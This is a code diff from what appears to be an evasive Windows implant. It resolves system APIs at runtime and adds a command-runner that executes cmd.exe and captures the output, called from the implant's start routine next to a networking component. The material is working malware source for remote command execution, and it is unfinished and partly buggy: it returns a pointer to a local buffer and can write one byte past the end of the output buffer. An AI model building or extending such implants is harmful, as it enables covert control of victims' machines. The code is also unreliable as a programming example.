@@ -37,20 +37,40 @@ Term::Term(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_h
     this->user32_handle = user32_handle;
 }
 
+// void my_copy_memory(void* dest, const void* src, size_t length) {
+//     char* d = static_cast<char*>(dest);
+//     const char* s = static_cast<const char*>(src);
+//     for (size_t i = 0; i < length; ++i) {
+//         d[i] = s[i];
+//     }
+// }
+
+void *my_copy_memory(void *dest, const void *src, size_t n) {
+    char *cdest = (char *)dest;
+    const char *csrc = (const char *)src;
+    for (size_t i = 0; i < n; i++) {
+        cdest[i] = csrc[i];
+    }
+    return dest;
+}
+
 char* Term::run(char* command) {
+    decltype(GetLastError) *get_last_error = RESOLVE_API(this->kernel32_handle, GetLastError);
+    decltype(ReadFile) *read_file = RESOLVE_API(this->kernel32_handle, ReadFile);
     decltype(WaitForSingleObject) *wait_for_single_object = RESOLVE_API(this->kernel32_handle, WaitForSingleObject);
     decltype(CreatePipe) *create_pipe = RESOLVE_API(this->kernel32_handle, CreatePipe);
     decltype(GetStdHandle) *get_std_handle = RESOLVE_API(this->kernel32_handle, GetStdHandle);
     decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
-    decltype(CreateProcess) *create_process = RESOLVE_API(this->kernel32_handle, CreateProcess);
+    decltype(CreateProcessA) *create_process = RESOLVE_API(this->kernel32_handle, CreateProcessA);
     decltype(CloseHandle) *close_handle = RESOLVE_API(this->kernel32_handle, CloseHandle);
     decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
+    decltype(RtlFreeHeap) *rtl_free_heap = RESOLVE_API(this->ntdll_handle, RtlFreeHeap);
     decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
 
     SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
     HANDLE read, write;
     if (!create_pipe(&read, &write, &sa, 0)) {
-        return NULL;
+        return "e:create_pipe";
     }
 
     STARTUPINFO si = {0};
@@ -64,19 +84,19 @@ char* Term::run(char* command) {
 
     HANDLE heap = get_process_heap();
     if (heap == NULL) {
-        return NULL;
+        return "e:get_process_heap";
     }
 
-    char* command_prefix = "cmd.exe /c ";
+    char* command_prefix = "cmd.exe /C dir";
 
     char* command_buffer = (char*)rtl_alloc_heap(heap, 0, strlen(command_prefix) + strlen(command) + 1);
 
     int chars_written_command_buffer = _wsprintf(command_buffer, "%s%s", command_prefix, command);
 
-    if (!create_process(NULL, const_cast<char*>(command_buffer), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    if (!create_process(NULL, command_buffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         close_handle(read);
         close_handle(write);
-        return NULL;
+        return "e:create_process";
     }
 
     close_handle(write);
@@ -86,7 +106,58 @@ char* Term::run(char* command) {
     close_handle(pi.hProcess);
     close_handle(pi.hThread);
 
-    // TODO: Getting late, tomorrow's problem...
+    size_t initial_capacity = 4096;
+    char* buffer = (char*)rtl_alloc_heap(heap, 0, initial_capacity);
+    if (buffer == NULL) {
+        close_handle(read);
+        return "e:rtl_alloc_heap";
+    }
+
+    size_t current_size = 0;
+    size_t capacity = initial_capacity;
+    DWORD bytes_read;
+
+    while (true) {
+        if (current_size == capacity) {
+            size_t new_capacity = capacity * 2;
+            char* new_buffer = (char*)rtl_alloc_heap(heap, 0, new_capacity);
+            if (new_buffer == NULL) {
+                rtl_free_heap(heap, 0, buffer);
+                close_handle(read);
+                return "e:rtl_alloc_heap2";
+            }
+
+            // RtlCopyMemory(new_buffer, buffer, current_size);
+            my_copy_memory(new_buffer, buffer, current_size);
+            rtl_free_heap(heap, 0, buffer);
+            buffer = new_buffer;
+            capacity = new_capacity;
+        }
+
+        DWORD to_read = (DWORD)(capacity - current_size);
+        if (!read_file(read, buffer + current_size, to_read, &bytes_read, NULL)) {
+            DWORD last_error = get_last_error();
+            if (last_error != ERROR_NO_DATA) {
+                // rtl_free_heap(heap, 0, buffer);
+                // close_handle(read);
+                // return "e:read_file";
+                char error_msg[256];
+                _wsprintf(error_msg, "ReadFile failed with error %d", last_error);
+                rtl_free_heap(heap, 0, buffer);
+                close_handle(read);
+                return error_msg;
+            }
+            break;
+        }
+        if (bytes_read == 0) {
+            break;
+        }
+        current_size += bytes_read;
+    }
+
+    buffer[current_size] = '\0';
+    close_handle(read);
+    return buffer;
 }
 
 class Machine {
@@ -387,6 +458,16 @@ auto declfn instance::start(_In_ void *arg) -> void {
         reinterpret_cast<uintptr_t>(user32)
     );
 	msgbox(nullptr, machine.get_id(), symbol<const char *>("caption"), MB_OK);
+
+    Term term(
+        reinterpret_cast<uintptr_t>(ntdll.handle),
+        reinterpret_cast<uintptr_t>(kernel32.handle),
+        reinterpret_cast<uintptr_t>(user32)
+    );
+    char* command = "";
+    char* output = term.run(command);
+    DBG_PRINTF("command output: %s", output);
+	msgbox(nullptr, output, symbol<const char *>("caption"), MB_OK);
 
     Net net(
         reinterpret_cast<uintptr_t>(ntdll.handle),
